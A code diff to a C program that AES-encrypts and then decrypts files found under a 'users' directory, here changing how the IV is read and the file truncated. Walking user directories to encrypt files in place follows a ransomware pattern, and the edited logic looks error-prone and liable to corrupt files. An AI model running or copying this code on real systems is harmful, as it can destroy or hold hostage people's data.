@@ -79,9 +79,10 @@ void decrypt(unsigned char *key, char *fileName) {
     curr_file = fopen(fileName, "rb");
     fseek(curr_file, -16L, SEEK_END);  
     read_byte = fread(iv, 1, 17, curr_file); // Read 16 bytes
+    int size = ftell(curr_file) - 16;
     iv[read_byte] = '\0';
-
-    fseek(curr_file, 0L, SEEK_SET);
+    rewind(curr_file);
+    truncate(fileName, size); // Truncate the file to remove the IV
 
     // Initiate cipher and store key/iv in it
     EVP_DecryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, key, iv);
@@ -115,7 +116,6 @@ void decrypt(unsigned char *key, char *fileName) {
     fclose(curr_file);
     remove(fileName); // Delete the current file
     rename(fileTemp, fileName); // Rename our temp to override the current file even if it wasn't deleted
-    //truncate(fileName, size); // Truncate the file to remove any extra bytes we added
 }
 
 int main () {
@@ -145,7 +145,6 @@ int main () {
         } 
         // Call the encryption function to encrypt the files
         encrypt(key, pathLocation);
-        sleep(2);
         decrypt(key, pathLocation);
     }
     closedir(users);    
